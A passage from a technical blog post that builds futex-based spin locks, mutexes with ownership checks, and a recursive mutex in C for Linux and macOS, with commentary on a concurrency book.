</span></span><span><span><span>h4x0r_futex_wake</span>(<span>h4x0r_futex_t</span> <span>*</span>futex, <span>bool</span> all)
</span></span><span><span>{
</span></span><span><span>    <span>uint32_t</span> n <span>=</span> all <span>?</span> INT_MAX : <span>1</span>;
</span></span><span><span>
</span></span><span><span>    <span>return</span> <span>syscall</span>(SYS_futex,
</span></span><span><span>                   futex,
</span></span><span><span>                   FUTEX_WAKE_PRIVATE,
</span></span><span><span>                   n,
</span></span><span><span>                   NULL,
</span></span><span><span>                   NULL,
</span></span><span><span>                   <span>0</span>);
</span></span><span><span>}
</span></span><span><span><span>#endif
</span></span></span></code></pre></div><p>When waking, we <strong>do not</strong> pass an expected value for the futex (it’s irrelevant), nor do we pass a timeout (this operation can’t block), and the error gets returned directly.</p><p>Instead, we do need to pass the number of threads to wake, but in our API, we’ve simplified that down to a flag to toggle between one waiter and all waiters.</p><p>My MacOS wrapper apparently is a bit out of date; I use the somewhat undocumented <code>__ulock</code> interface (its documentation is just some comments in the Darwin source code), but TIL that they added a new, simpler interface, just last year (<code>os_sync_wait_on_address</code>). Still, for now, we’ll go old school for better compatibility and build the same two operations:</p><div><pre tabindex="0"><code data-lang="c"><span><span><span>#if defined(__APPLE__)
</span></span></span><span><span><span>#include</span> <span>&lt;stdint.h&gt;</span><span>
</span></span></span><span><span><span></span>
</span></span><span><span><span>// These were never exposed in any headers.
</span></span></span><span><span><span></span><span>extern</span> <span>int</span> <span>__ulock_wait2</span>(<span>uint32_t</span>, <span>void</span> <span>*</span>, <span>uint64_t</span>, <span>uint64_t</span>, <span>uint64_t</span>);
</span></span><span><span><span>extern</span> <span>int</span> <span>__ulock_wake</span>(<span>uint32_t</span>, <span>void</span> <span>*</span>, <span>uint64_t</span>);
</span></span><span><span>
</span></span><span><span><span>#define H4X0R_NSEC_PER_SEC                   1000000000
</span></span></span><span><span><span>#define H4X0R_LOCK_COMPARE_AND_WAIT          1
</span></span></span><span><span><span>#define H4X0R_LOCK_WAKE_ALL                  0x00000100
</span></span></span><span><span><span>#define H4X0R_LOCK_WAKE_THREAD               0x00000200
</span></span></span><span><span><span></span>
</span></span><span><span><span>#define H4X0R_WAKE_ALL    (H4X0R_LOCK_COMPARE_AND_WAIT | H4X0R_LOCK_WAKE_ALL)
</span></span></span><span><span><span>#define H4X0R_WAKE_THREAD (H4X0R_LOCK_COMPARE_AND_WAIT | H4X0R_LOCK_WAKE_THREAD)
</span></span></span><span><span><span></span>
</span></span><span><span><span>static</span> <span>inline</span> <span>int</span>
</span></span><span><span><span>h4x0r_futex_wait_timespec</span>(<span>h4x0r_futex_t</span>   <span>*</span>futex,
</span></span><span><span>                         <span>uint32_t</span>         expected,
</span></span><span><span>                         <span>struct</span> timespec <span>*</span>timeout)
</span></span><span><span>{
</span></span><span><span>    <span>uint64_t</span> timeout_ns <span>=</span> <span>0</span>;
</span></span><span><span>
</span></span><span><span>    <span>if</span> (timeout) {
</span></span><span><span>        timeout_ns <span>=</span> timeout<span>-&gt;</span>tv_nsec <span>+</span> timeout<span>-&gt;</span>tv_sec <span>*</span> H4X0R_NSEC_PER_SEC;
</span></span><span><span>    }
</span></span><span><span>    <span>return</span> <span>__ulock_wait2</span>(H4X0R_LOCK_COMPARE_AND_WAIT,
</span></span><span><span>                         futex,
</span></span><span><span>                         (<span>uint64_t</span>)expected,
</span></span><span><span>                         timeout_ns,
</span></span><span><span>                         <span>0</span>);
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>static</span> <span>inline</span> <span>int</span>
</span></span><span><span><span>h4x0r_futex_wake</span>(<span>h4x0r_futex_t</span> <span>*</span>futex, <span>bool</span> all)
</span></span><span><span>{
</span></span><span><span>    <span>return</span> <span>__ulock_wake</span>(all <span>?</span> H4X0R_WAKE_ALL : H4X0R_WAKE_THREAD,
</span></span><span><span>                        futex,
</span></span><span><span>                        <span>0ULL</span>);
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>#endif
</span></span></span></code></pre></div><h2 id="the-missing-mutex-primitive">The missing mutex primitive</h2><p>The book doesn’t really cover the mutex well, focusing more on the term “mutual exclusion”, which gets its own chapter early days, and is thrown around liberally in a chapter about spin locks. Sure, locks don’t need to involve waiting, and the core of a mutex doesn’t require waiting. So a spin lock is definitely a form of mutex. The book does show spin locks, and they’re not hard to build:</p><div><pre tabindex="0"><code data-lang="c"><span><span><span>#include</span> <span>&lt;stdatomic.h&gt;</span><span>
</span></span></span><span><span><span>#include</span> <span>&lt;stdint.h&gt;</span><span>
</span></span></span><span><span><span></span>
</span></span><span><span><span>typedef</span> _Atomic <span>uint32_t</span> <span>h4x0r_spin_lock_t</span>;
</span></span><span><span>
</span></span><span><span><span>static</span> <span>inline</span> <span>void</span>
</span></span><span><span><span>h4x0r_spin_lock_init</span>(<span>h4x0r_spin_lock_t</span> <span>*</span>lock)
</span></span><span><span>{
</span></span><span><span>    <span>atomic_store</span>(lock, <span>0</span>);        
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>static</span> <span>inline</span> <span>void</span>
</span></span><span><span><span>h4x0r_spin_lock_acquire</span>(<span>h4x0r_spin_lock_t</span> <span>*</span>lock)
</span></span><span><span>{
</span></span><span><span>    <span>while</span> (<span>atomic_fetch_or</span>(lock, <span>1</span>)) <span>/* do nothing */</span> ;
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>static</span> <span>inline</span> <span>void</span>
</span></span><span><span><span>h4x0r_spin_lock_release</span>(<span>h4x0r_spin_lock_t</span> <span>*</span>lock)
</span></span><span><span>{
</span></span><span><span>   <span>atomic_store</span>(lock, <span>0</span>);
</span></span><span><span>}
</span></span></code></pre></div><p>It might not be intuitive why the above lock works. The <code>atomic_fetch_or()</code> operation performs a bit-wise OR, but returns the value from before the operation began. As implied by the “function” name, the entire operation happens atomically, and in reality, won’t be a proper function; it’ll most likely inline to a tiny bit of assembly.</p><p>Let’s say 100 threads are contending for the lock, and let’s just imagine no thread gives up the lock, either. We use the version of this API that guarantees sequential consistency. As a result, at runtime, all threads will essentially perform the OR, but only one will see <code>0</code> as a return value. That’s the thread that gets the lock.</p><p>Many people are surprised that any lock can be built with only single bit, but there you go.</p><p>Still, our simple spin lock has some potential problems:</p><ol><li>It doesn’t deal with heavy contention (i.e., it doesn’t provide a way to offload CPU via waiting).</li><li>If a thread mistakenly calls our <code>unlock</code> operation on a lock it doesn’t own, it’ll unlock the lock 😱</li><li>If a thread recursively tries to acquire this lock, it’ll end up blocked, waiting for a lock it already holds– deadlock!</li></ol><p>Some people wouldn’t consider the last one a real problem, as we’ll discuss later. But the other two are definitely worth addressing.</p><p>Anyway, let’s show how we can deal with all of these issues.</p><h2 id="when-and-how-to-block">When and how to block</h2><p>Most libraries will have separate APIs for spin locks and mutexes.</p><p>Yet, good mutex implementations <em>do</em> tend to start with a spin lock, and if they try some number of times and fail, then there’s too much contention, so they wait.</p><p>If the lock is uncontended, the spin lock will be successful on the first try, and will be pretty fast – no system call. With light contention and a short critical section, we may still get the lock without having to make the system call to wait.</p><p>One thing I wanted to see from the book was guidance on how long mutexes should spin for. Surely, there’s not a one-size-fits-all answer, especially as hardware platforms evolve. Clearly, the overhead of a system call, the number of tasks, and the duration of the critical section could all come into play, but does anyone have any metrics here?</p><p>Personally, I just tend to use a hard-coded <code>16</code> iterations, but with no strong reason. I suppose I probably saw someone else use it once, but also with no explanation.</p><p>When it comes to dealing with contention, the book covers exponential back-off – when you don’t get the lock due to contention, you exponentially increase the time you wait, in an attempt to try to spread out contention (usually, exponential backup stops at some maximum duration, which usually comes after 5-8 failed attempts).</p><p>But what do they tell you to do?? Call <code>sleep()</code> for the backoff period. What if contention clears right as you put yourself to sleep? You wait anyway, and while perhaps you had the opportunity to take the lock uncontested had you kept spinning, and you might get really unlucky, and the contention could come back right as you’re waking up.</p><p>By the way, blocking is <strong>so</strong> overlooked in this book; they don’t even <em>mention</em> the word polling (I bought the e-book and searched extensively). This issue with using <code>sleep()</code> to block certainly isn’t mentioned, even when it’s casually tossed into their code.</p><p>You probably have an inkling already– the futex is how modern locks avoid these problems.</p><p>If a futex is available, exponential backoff (or any polling-based approach) makes little sense. With polling, wakes are essentially arbitrary guesses. With the futex, wakes are explicitly tied to the mutex becoming available.</p><p>When there’s significant contention with a polling-based approach, if we don’t use exponential back-off, we could end up with many threads continuing to wake up all at the same time, just to contend with each other again.</p><p>With a futex, we can just wake up a single thread (which might have to contend with new threads coming in).</p><p>Let’s build it, even though we still won’t be dealing with recursion or accidental unlocks.</p><p>Given the risk of accidental unlock, we’ll call this our “unsafe” mutex.</p><div><pre tabindex="0"><code data-lang="c"><span><span><span>#define H4X0R_SPIN_COUNT 16
</span></span></span><span><span><span></span>
</span></span><span><span><span>typedef</span> <span>h4x0r_futex_t</span> <span>h4x0r_mutex_unsafe_t</span>;
</span></span><span><span>
</span></span><span><span><span>static</span> <span>inline</span> <span>void</span>
</span></span><span><span><span>h4x0r_mutex_unsafe_init</span>(<span>h4x0r_mutex_unsafe_t</span> <span>*</span>lock)
</span></span><span><span>{
</span></span><span><span>    <span>atomic_store</span>(lock, <span>0</span>);        
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>static</span> <span>inline</span> <span>void</span>
</span></span><span><span><span>h4x0r_mutex_unsafe_acquire</span>(<span>h4x0r_mutex_unsafe_t</span> <span>*</span>lock)
</span></span><span><span>{
</span></span><span><span>    <span>for</span> (<span>uint32_t</span> i <span>=</span> <span>0</span>; i <span>&lt;</span> H4X0R_SPIN_COUNT; i<span>++</span>) {
</span></span><span><span>        <span>if</span> (<span>!</span><span>atomic_fetch_or</span>(lock, <span>1</span>)) {
</span></span><span><span>            <span>return</span>;
</span></span><span><span>        }
</span></span><span><span>    }
</span></span><span><span>    <span>while</span> (true) {
</span></span><span><span>        <span>h4x0r_futex_wait_timespec</span>((<span>h4x0r_futex_t</span> <span>*</span>)lock, <span>1</span>, NULL);
</span></span><span><span>        <span>if</span> (<span>!</span><span>atomic_fetch_or</span>(lock, <span>1</span>)) {
</span></span><span><span>            <span>return</span>;
</span></span><span><span>        }
</span></span><span><span>    }
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>static</span> <span>inline</span> <span>void</span>
</span></span><span><span><span>h4x0r_mutex_unsafe_release</span>(<span>h4x0r_mutex_unsafe_t</span> <span>*</span>lock)
</span></span><span><span>{
</span></span><span><span>   <span>atomic_store</span>(lock, <span>0</span>);
</span></span><span><span>   <span>h4x0r_futex_wake</span>(lock, false);
</span></span><span><span>}
</span></span></code></pre></div><p>Here, we spin for a bit, and if things aren’t contested, then we wait on the futex. Whoever has the lock will notify up to one thread on wake. For our simple use case, it doesn’t really matter why we fail if we don’t wait on the futex, so we just loop.</p><table><tbody><tr><td>‼️</td><td>You are generally not guaranteed that threads will be awoken in any specific order. Still, generally, that's probably not worth worrying about.</td></tr></tbody></table><h2 id="minimizing-system-calls">Minimizing system calls</h2><p>The futex can help us avoid a bunch of unnecessary wake-ups, and thus a lot of system calls. However, in many cases, mutex access will be totally uncontested, and we’ll be making a system call to wake up… nobody.</p><p>There are ways to address this pretty simply, allowing us to avoid <em>most</em> spurious wakeups. We’re only using one bit of our futex, and it doesn’t actually matter which bit. So we’re going to move the bit up to the top, and use the rest as a wait-counter.</p><p>We’ll have threads add to it before they first try to go to sleep, and subtract when they wake up. When the thread holding the lock unlocks the mutex, we’ll use <code>atomic_fetch_and()</code> to remove the mutex’s <strong>lock</strong> flag, but leave all other bits intact, and we’ll then look to see if the wait-count is zero. If it is, we’ll skip the wake-up.</p><p>This can still lead to <em>some</em> extra system calls:</p><ol><li><p>The mutex could get released after the thread added its value to wait count, but before it actually puts itself to sleep.</p></li><li><p>Other threads may end up adding to the count and going to sleep once we’ve released, and after another thread grabbed the lock.</p></li></ol><p>The first case seems scary; it won’t risk a deadlock, because if the unlock happens before the wait, the waiting thread will have the wrong expected value, and the futex call will fail.</p><p>The second case leads to a spurious wake-up. The woken thread checks the futex again, sees it’s locked, and goes back to sleep, but that’s two extra system calls.</p><p>Still, this is going to avoid plenty of unnecessary wakes and system calls in practice.</p><p>Using this idea, let’s build our second mutex. This version is also unsafe, because we’re not yet dealing with ownership, so we’ll modify calls with <code>unsafe2</code>. But we’ll reuse the <code>h4x0r_mutex_unsafe_t</code> type, and calls that do not change from the previous implementation.</p><div><pre tabindex="0"><code data-lang="c"><span><span><span>// We'll re-use these constants in our last mutex.
</span></span></span><span><span><span></span><span>#define H4X0R_MUTEX_LOCK_ON (1 &lt;&lt; 31)
</span></span></span><span><span><span>#define H4X0R_MUTEX_LOCK_OFF ~(H4X0R_MUTEX_LOCK_ON)
</span></span></span><span><span><span></span>
</span></span><span><span><span>// This function will get reused too.
</span></span></span><span><span><span></span><span>static</span> <span>inline</span> <span>bool</span>
</span></span><span><span><span>h4x0r_mutex_value_is_unlocked</span>(<span>uint32_t</span> value)
</span></span><span><span>{
</span></span><span><span>    <span>return</span> <span>!</span>(value <span>&amp;</span> H4X0R_MUTEX_LOCK_ON);
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>static</span> <span>inline</span> <span>bool</span>
</span></span><span><span><span>h4x0r_mutex_unsafe2_try_lock</span>(<span>h4x0r_mutex_unsafe_t</span> <span>*</span>lock)
</span></span><span><span>{
</span></span><span><span>    <span>uint32_t</span> value <span>=</span> <span>atomic_fetch_or</span>(lock, H4X0R_MUTEX_LOCK_ON);
</span></span><span><span>    <span>return</span> <span>h4x0r_mutex_value_is_unlocked</span>(value);
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>static</span> <span>inline</span> <span>uint32_t</span>
</span></span><span><span><span>h4x0r_mutex_unsafe2_add_waiter</span>(<span>h4x0r_mutex_unsafe_t</span> <span>*</span>lock)
</span></span><span><span>{
</span></span><span><span>    <span>return</span> <span>1</span> <span>+</span> <span>atomic_fetch_add</span>(lock, <span>1</span>);
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>static</span> <span>inline</span> <span>void</span>
</span></span><span><span><span>h4x0r_mutex_unsafe2_acquire</span>(<span>h4x0r_mutex_unsafe_t</span> <span>*</span>lock)
</span></span><span><span>{
</span></span><span><span>    <span>uint32_t</span> expected;
</span></span><span><span>
</span></span><span><span>    <span>for</span> (<span>uint32_t</span> i <span>=</span> <span>0</span>; i <span>&lt;</span> H4X0R_SPIN_COUNT; i<span>++</span>) {
</span></span><span><span>        <span>if</span> (<span>h4x0r_mutex_unsafe2_try_lock</span>(lock)) {
</span></span><span><span>            <span>return</span>;
</span></span><span><span>        }
</span></span><span><span>    }
</span></span><span><span>
</span></span><span><span>    expected <span>=</span> <span>h4x0r_mutex_unsafe2_add_waiter</span>(lock);
</span></span><span><span>
</span></span><span><span>    <span>while</span> (true) {
</span></span><span><span>        <span>if</span> (<span>h4x0r_mutex_value_is_unlocked</span>(expected)
</span></span><span><span>	    <span>&amp;&amp;</span> <span>h4x0r_mutex_unsafe2_try_lock</span>(lock)) {
</span></span><span><span>            <span>atomic_fetch_add</span>(lock, <span>-</span><span>1</span>);
</span></span><span><span>            <span>return</span>;
</span></span><span><span>        }
</span></span><span><span>
</span></span><span><span>        <span>h4x0r_futex_wait_timespec</span>((<span>h4x0r_futex_t</span> <span>*</span>)lock, expected, NULL);
</span></span><span><span>        expected <span>=</span> <span>atomic_load</span>(lock);
</span></span><span><span>    }
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>static</span> <span>inline</span> <span>void</span>
</span></span><span><span><span>h4x0r_mutex_unsafe2_release</span>(<span>h4x0r_mutex_unsafe_t</span> <span>*</span>lock)
</span></span><span><span>{
</span></span><span><span>   <span>uint32_t</span> waiters <span>=</span> <span>atomic_fetch_and</span>(lock, H4X0R_MUTEX_LOCK_OFF);
</span></span><span><span>
</span></span><span><span>   <span>if</span> (waiters <span>!=</span> H4X0R_MUTEX_LOCK_ON) {
</span></span><span><span>       <span>h4x0r_futex_wake</span>(lock, false);
</span></span><span><span>   }
</span></span><span><span>}
</span></span></code></pre></div><p>We broke out the lock test and the attempt to lock into separate inline functions for clarity.</p><p>Also, we did the same for the function that registers ourselves as a waiter, as it’s a little more complicated than just atomically bumping the wait count. Much like <code>atomic_fetch_or()</code>, the function <code>atomic_fetch_add()</code> will return the value there <strong>BEFORE</strong> our modification.</p><p>But, we’re going to have to tell the futex routine what value we think is there when we go to wait, so we <em>also</em> need to add to the wait count on the value that gets returned.</p><p>Notice that, when we do add to the wait count, it doesn’t matter how many times we wake from the futex; we only add ourselves one time, and remove ourselves only once we <em>acquire</em> the lock. We definitely don’t want ourselves to be counted when we test to see if we should make the system call to wake a waiter.</p><p>Here too, <code>atomic_fetch_and()</code> will return a value before our operation is applied. So in this mutex, if there are no waiters at the point of our atomic operation, the value we get back will actually be <code>H4X0R_MUTEX1_LOCK_ON</code>, even though we will have just set the mutex’s value to <code>0</code>.</p><p>Here, we don’t redo the operation; we just make the proper comparison.</p><h2 id="asserting-ownership">Asserting Ownership</h2><p>Dealing with ownership isn’t too big a deal; we just need to keep track of who owns the lock, if anyone, and check it when it’s safe to do so.</p><p>We’ll use <code>pthread_t</code> for identity, which we can directly store and compare, even though it has a slight issue– the underlying implementation of the data structure is implementation-dependent.</p><p>This means we can’t 100% reliably keep track of the thread with just the <code>pthread_t</code> value, because we don’t know a portable value that says “not a thread.” The easiest thing for us to do is just take up some more space, and keep a flag to keep track of whether it’s owned or not, for when we are checking ownership.</p><p>Once we check ownership, our mutex is safe, so this will be our default mutex type (we’ll modify this code to make a recursive mutex later).</p><p>Here, then, is our new mutex definition and initializer:</p><div><pre tabindex="0"><code data-lang="c"><span><span><span>typedef</span> <span>struct</span> {
</span></span><span><span>    <span>h4x0r_futex_t</span>      futex;
</span></span><span><span>    <span>_Atomic</span>(<span>pthread_t</span>) owner;
</span></span><span><span>    <span>_Atomic</span>(<span>bool</span>)      owned;
</span></span><span><span>} <span>h4x0r_mutex_t</span>;
</span></span><span><span>
</span></span><span><span><span>static</span> <span>inline</span> <span>void</span>
</span></span><span><span><span>h4x0r_mutex_init</span>(<span>h4x0r_mutex_t</span> <span>*</span>mutex)
</span></span><span><span>{
</span></span><span><span>    <span>*</span>mutex <span>=</span> (<span>h4x0r_mutex_t</span>) {
</span></span><span><span>	.futex <span>=</span> <span>0</span>,
</span></span><span><span>	.owned <span>=</span> false,
</span></span><span><span>    };
</span></span><span><span>}
</span></span></code></pre></div><p>We’ve declared all of the fields atomic. Yes, we’re only going to change them when we own the mutex, but we can’t always count on sequential consistency on the fields if they aren’t atomic, even if they’re in the same struct as threads that are. There are platforms (like ARM) where you’re particularly at risk of issues if you’re not really careful. When in doubt, go for full sequential consistency.</p><p>The atomics do force sequential consistency when we update those fields. Without it, we might end up with, for instance, thread A yielding the futex, but their ownership flag still being set when thread B quickly grabs the lock.</p><p>In the rest of this implementation, we’re going to take the same basic approach we did with the previous mutex, with the significant changes (besides moving from a uint32_t only to a data structure) being:</p><ol><li>When we unlock a mutex, we’ll double-check that we own it first. If we do <strong>NOT</strong>, that’s a fatal error, and we’ll print a message and abort.</li><li>We’ll check for ownership <em>before</em> we acquire a lock.</li><li>With this check, if there’s an owner, and we’re <em>not</em> it, that’s also a fatal error.</li></ol><p>We’ll also add a timeout field to our lock, which we’ll pass down to the futex if we block (the time we spend spinning will be irrelevant).</p><div><pre tabindex="0"><code data-lang="c"><span><span><span>static</span> <span>inline</span> <span>bool</span>
</span></span><span><span><span>h4x0r_mutex_try_lock</span>(<span>h4x0r_mutex_t</span> <span>*</span>lock)
</span></span><span><span>{
</span></span><span><span>
</span></span><span><span>    <span>uint32_t</span> value <span>=</span> <span>atomic_fetch_or</span>(<span>&amp;</span>lock<span>-&gt;</span>futex, H4X0R_MUTEX_LOCK_ON);
</span></span><span><span>    <span>pthread_t</span> self;
</span></span><span><span>
</span></span><span><span>    <span>if</span> (<span>!</span><span>h4x0r_mutex_value_is_unlocked</span>(value)) {
</span></span><span><span>	<span>return</span> false;
</span></span><span><span>    }
</span></span><span><span>    <span>// If what we read when we wrote says "unlocked", then we
</span></span></span><span><span><span></span>    <span>// successfully acquired the lock.
</span></span></span><span><span><span></span>    self <span>=</span> <span>pthread_self</span>();
</span></span><span><span>
</span></span><span><span>    <span>if</span> (<span>atomic_load</span>(<span>&amp;</span>lock<span>-&gt;</span>owned)) {
</span></span><span><span>	<span>if</span> (<span>pthread_equal</span>(self, <span>atomic_load</span>(<span>&amp;</span>lock<span>-&gt;</span>owner))) {
</span></span><span><span>	    <span>fprintf</span>(stderr, <span>"Mutex was used recursively.</span><span>\n</span><span>"</span>);
</span></span><span><span>	}
</span></span><span><span>	<span>else</span> {
</span></span><span><span>	    <span>fprintf</span>(stderr, <span>"Acquired a lock owner didn't properly yield.</span><span>\n</span><span>"</span>);
</span></span><span><span>	}
</span></span><span><span>	<span>abort</span>();
</span></span><span><span>    }
</span></span><span><span>	
</span></span><span><span>    <span>// We have the lock, so we make it known.
</span></span></span><span><span><span></span>    <span>atomic_store</span>(<span>&amp;</span>lock<span>-&gt;</span>owned, true);
</span></span><span><span>    <span>atomic_store</span>(<span>&amp;</span>lock<span>-&gt;</span>owner, self);
</span></span><span><span>    
</span></span><span><span>    <span>return</span> true;
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>static</span> <span>inline</span> <span>uint32_t</span>
</span></span><span><span><span>h4x0r_mutex_add_waiter</span>(<span>h4x0r_mutex_t</span> <span>*</span>lock)
</span></span><span><span>{
</span></span><span><span>    <span>return</span> <span>1</span> <span>+</span> <span>atomic_fetch_add</span>(<span>&amp;</span>lock<span>-&gt;</span>futex, <span>1</span>);
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>static</span> <span>inline</span> <span>bool</span>
</span></span><span><span><span>h4x0r_mutex_acquire</span>(<span>h4x0r_mutex_t</span> <span>*</span>lock, <span>struct</span> timespec <span>*</span>timeout)
</span></span><span><span>{
</span></span><span><span>    <span>uint32_t</span>  expected;
</span></span><span><span>
</span></span><span><span>    <span>for</span> (<span>uint32_t</span> i <span>=</span> <span>0</span>; i <span>&lt;</span> H4X0R_SPIN_COUNT; i<span>++</span>) {
</span></span><span><span>        <span>if</span> (<span>h4x0r_mutex_try_lock</span>(lock)) {
</span></span><span><span>            <span>return</span> true;
</span></span><span><span>        }
</span></span><span><span>    }
</span></span><span><span>
</span></span><span><span>    expected <span>=</span> <span>h4x0r_mutex_add_waiter</span>(lock);
</span></span><span><span>
</span></span><span><span>    <span>while</span> (true) {
</span></span><span><span>        <span>if</span> (<span>h4x0r_mutex_value_is_unlocked</span>(expected) <span>&amp;&amp;</span>
</span></span><span><span>	    <span>h4x0r_mutex_try_lock</span>(lock)) {
</span></span><span><span>            <span>atomic_fetch_add</span>(<span>&amp;</span>lock<span>-&gt;</span>futex, <span>-</span><span>1</span>);
</span></span><span><span>            <span>return</span> true;
</span></span><span><span>        }
</span></span><span><span>
</span></span><span><span>        <span>int</span> err <span>=</span> <span>h4x0r_futex_wait_timespec</span>((<span>h4x0r_futex_t</span> <span>*</span>)<span>&amp;</span>lock<span>-&gt;</span>futex,
</span></span><span><span>					    expected,
</span></span><span><span>					    timeout);
</span></span><span><span>
</span></span><span><span>	<span>if</span> (err <span>==</span> ETIMEDOUT) {
</span></span><span><span>	    <span>return</span> false;
</span></span><span><span>	}
</span></span><span><span>        expected <span>=</span> <span>atomic_load</span>(<span>&amp;</span>lock<span>-&gt;</span>futex);
</span></span><span><span>    }
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>static</span> <span>inline</span> <span>void</span>
</span></span><span><span><span>h4x0r_mutex_release</span>(<span>h4x0r_mutex_t</span> <span>*</span>lock)
</span></span><span><span>{
</span></span><span><span>    <span>if</span> (<span>!</span><span>atomic_load</span>(<span>&amp;</span>lock<span>-&gt;</span>owned)
</span></span><span><span>        <span>||</span> <span>!</span><span>pthread_equal</span>(<span>pthread_self</span>(), <span>atomic_load</span>(<span>&amp;</span>lock<span>-&gt;</span>owner))) {
</span></span><span><span>	<span>fprintf</span>(stderr, <span>"Thread unlocked a mutex it doesn't own.</span><span>\n</span><span>"</span>);
</span></span><span><span>	<span>abort</span>();
</span></span><span><span>    }
</span></span><span><span>        
</span></span><span><span>    <span>atomic_store</span>(<span>&amp;</span>lock<span>-&gt;</span>owned, false);
</span></span><span><span>    
</span></span><span><span>    <span>uint32_t</span> waiters <span>=</span> <span>atomic_fetch_and</span>(<span>&amp;</span>lock<span>-&gt;</span>futex, H4X0R_MUTEX_LOCK_OFF);
</span></span><span><span>
</span></span><span><span>    <span>if</span> (waiters <span>!=</span> H4X0R_MUTEX_LOCK_ON) {
</span></span><span><span>	<span>h4x0r_futex_wake</span>(<span>&amp;</span>lock<span>-&gt;</span>futex, false);
</span></span><span><span>    }
</span></span><span><span>}
</span></span></code></pre></div><p>We implemented our locking capability on top of <code>h4x0r_mutex_try_lock()</code>, which makes a single attempt to claim a lock. If it succeeds, it then performs its validity checks, and if THOSE succeed, it sets the ownership info.</p><p>When we’re releasing the lock, we test the boolean to see if there’s an owner. If that’s set, we then ensure that we’re the right owner.</p><p>The <code>try_lock</code> is a common API feature for mutexes, as an alternative to a timeout.</p><h2 id="does-it-feel-like-were-repeating-ourselves">Does it feel like we’re repeating ourselves?</h2><p>There’s a very good question the book didn’t seem to opine on: whether you should ever be using recursive mutexes at all. For mutexes, I tend to lean towards <strong>no</strong>, as it encourages sloppy programming.</p><p>But, I will admit to being on the fence, and you’re mature enough to make up your own minds. So let’s look at what we’d have to do.</p><p>To make our previous lock recursive, we’ll keep a field that keeps track of the levels of nesting. To avoid deadlocking with ourselves, our lock functions will need to check to ensure they don’t own the lock before their first lock attempt.</p><p>For that reason, the core <code>try_lock</code> operation is moved to a call marked <code>internal</code>, specifically <code>h4x0r_mutex_recursive_internal_try_lock()</code>. The call <code>h4x0r_mutex_recursive_try_lock()</code> only needs to perform the ownership check, then can make the internal call.</p><p>Here’s what initialization looks like now:</p><div><pre tabindex="0"><code data-lang="c"><span><span><span>typedef</span> <span>struct</span> {
</span></span><span><span>    <span>h4x0r_futex_t</span>      futex;
</span></span><span><span>    <span>_Atomic</span>(<span>uint32_t</span>)  depth;
</span></span><span><span>    <span>_Atomic</span>(<span>pthread_t</span>) owner;
</span></span><span><span>    <span>_Atomic</span>(<span>bool</span>)      owned;
</span></span><span><span>} <span>h4x0r_mutex_recursive_t</span>;
</span></span><span><span>
</span></span><span><span>
</span></span><span><span><span>static</span> <span>inline</span> <span>void</span>
</span></span><span><span><span>h4x0r_mutex_recursive_init</span>(<span>h4x0r_mutex_recursive_t</span> <span>*</span>mutex)
</span></span><span><span>{
</span></span><span><span>    <span>*</span>mutex <span>=</span> (<span>h4x0r_mutex_recursive_t</span>) {
</span></span><span><span>	.futex <span>=</span> <span>0</span>,
</span></span><span><span>	.depth <span>=</span> <span>0</span>,
</span></span><span><span>	.owned <span>=</span> false,
</span></span><span><span>    };
</span></span><span><span>}
</span></span></code></pre></div><p>That’s no big deal. Since two different lock calls now need to check ownership, we’ll break that out into its own helper.</p><p>We’re going to need to check ownership before we try to lock the first time. We’ll have our function return <code>true</code> if the calling thread already owns the lock, and false if not.</p><p>So it will return false:</p><ol><li>If the mutex is not owned.</li><li>If it’s locked, but the current thread doesn’t own it.</li></ol><p>If it’s not one of these two cases, then it’s a recursive call by the owner. This call will bump up the depth counter before returning <code>true</code>; the caller can immediately bail.</p><div><pre tabindex="0"><code data-lang="c"><span><span><span>static</span> <span>inline</span> <span>bool</span>
</span></span><span><span><span>h4x0r_mutex_recursive_check_ownership</span>(<span>h4x0r_mutex_recursive_t</span> <span>*</span>lock,
</span></span><span><span>				      <span>pthread_t</span>                self)
</span></span><span><span>{
</span></span><span><span>    <span>if</span> (<span>!</span><span>atomic_load</span>(<span>&amp;</span>lock<span>-&gt;</span>owned)) {
</span></span><span><span>	<span>return</span> false;
</span></span><span><span>    }
</span></span><span><span>    <span>if</span> (<span>pthread_equal</span>(self, <span>atomic_load</span>(<span>&amp;</span>lock<span>-&gt;</span>owner))) {
</span></span><span><span>	<span>atomic_fetch_add</span>(<span>&amp;</span>lock<span>-&gt;</span>depth, <span>1</span>);
</span></span><span><span>	<span>return</span> true;
</span></span><span><span>    }
</span></span><span><span>
</span></span><span><span>    <span>return</span> false;
</span></span><span><span>}
</span></span></code></pre></div><p>If we didn’t own the lock, once we acquire the lock, we need to assert our ownership. At this point, we can double-check that the lock is not marked as owned. If it were, that’d indicate a bug in our implementation, so it could make some sense to skip that check.</p><div><pre tabindex="0"><code data-lang="c"><span><span><span>// Called from our internal try-lock call, once it knows we definitely
</span></span></span><span><span><span>// just acquired ownership.
</span></span></span><span><span><span></span><span>static</span> <span>inline</span> <span>void</span>
</span></span><span><span><span>h4x0r_mutex_recursive_new_ownership</span>(<span>h4x0r_mutex_recursive_t</span> <span>*</span>lock,
</span></span><span><span>				    <span>pthread_t</span>                self)
</span></span><span><span>{
</span></span><span><span>    <span>if</span> (<span>atomic_load</span>(<span>&amp;</span>lock<span>-&gt;</span>owned)) {
</span></span><span><span>	<span>fprintf</span>(stderr, <span>"Acquired a lock owner didn't properly yield.</span><span>\n</span><span>"</span>);
</span></span><span><span>	<span>abort</span>();
</span></span><span><span>    }
</span></span><span><span>    <span>atomic_store</span>(<span>&amp;</span>lock<span>-&gt;</span>owned, true);
</span></span><span><span>    <span>atomic_store</span>(<span>&amp;</span>lock<span>-&gt;</span>owner, self);
</span></span><span><span>    <span>atomic_store</span>(<span>&amp;</span>lock<span>-&gt;</span>depth, <span>1</span>);
</span></span><span><span>}
